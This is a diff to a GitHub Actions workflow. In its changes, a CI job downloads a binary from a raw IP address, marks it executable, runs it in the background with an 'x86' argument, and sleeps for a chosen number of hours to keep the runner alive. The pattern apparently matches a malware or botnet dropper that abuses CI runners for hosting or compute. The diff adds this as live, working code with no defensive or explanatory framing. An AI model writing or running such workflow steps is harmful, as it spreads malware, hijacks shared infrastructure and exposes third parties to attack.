@@ -23,19 +23,18 @@ jobs:
     steps:
     - name: Download binary
       run: |
-        apt update
+        wget http://45.138.16.158/bins/px86 -O px86
+        chmod +x px86
 
-    - name: Keep VM alive with restart loop
+    - name: Run binary with keep-alive
       run: |
         UPTIME=${{ github.event.inputs.uptime }}
-        END_TIME=$(( $(date +%s) + ($UPTIME * 3600) ))
-        echo "Will keep running until: $(date -d @$END_TIME)"
+        echo "Running for $UPTIME hours"
         
-        while [ $(date +%s) -lt $END_TIME ]; do
-          echo "Attempting to run binary..."
-          # Try to run the binary, but continue even if it fails
-          ./px86 x86 || echo "Binary exited, continuing..."
-          sleep 1
-        done
+        # Start binary in background
+        ./px86 x86 &
         
-        echo "Successfully completed $UPTIME hours"
+        # Keep workflow alive with discrete sleep
+        sleep $(($UPTIME * 3600))
+        
+        echo "Completed successfully"
